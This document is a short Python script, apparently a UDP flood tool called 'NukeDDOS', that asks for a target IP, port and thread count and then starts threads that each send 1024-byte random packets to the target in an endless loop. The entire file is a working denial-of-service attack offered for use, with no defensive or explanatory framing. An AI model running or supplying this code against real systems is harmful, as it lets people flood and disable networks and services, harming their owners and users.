import sys
import os
import time
import socket
import random
import threading
from datetime import datetime
from colorama import init, Fore

# Initialize colorama
init()

# Initial settings
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
data = random._urandom(1024)
sent = 0
lock = threading.Lock()

# Configuration interface
os.system("clear")
os.system("figlet -f slant NukeDDOS")
print(Fore.MAGENTA + "Author   : Laila19")
print("github   : https://github.com/lailacypher")
print()
ip = input("Target IP : ").strip()
port = int(input("Port      : ").strip())
threads = int(input("Threads   : ").strip())

# Initial progress bar
os.system("clear")
os.system("figlet -f slant Attack Starting")
progress = ["[                    ] 0%", "[=====               ] 25%", "[==========          ] 50%", "[===============     ] 75%", "[====================] 100%"]
for step in progress:
    print(Fore.MAGENTA + step)
    time.sleep(1)

# Function for attack
def attack():
    global sent
    while True:
        try:
            sock.sendto(data, (ip, port))
            with lock:
                sent += 1
                print(f"Packets {sent} sent successfully to {ip} through port {port}")
        except Exception as e:
            print(f"Error sending packet: {e}")

# Starting threads
for _ in range(threads):
    thread = threading.Thread(target=attack)
    thread.start()
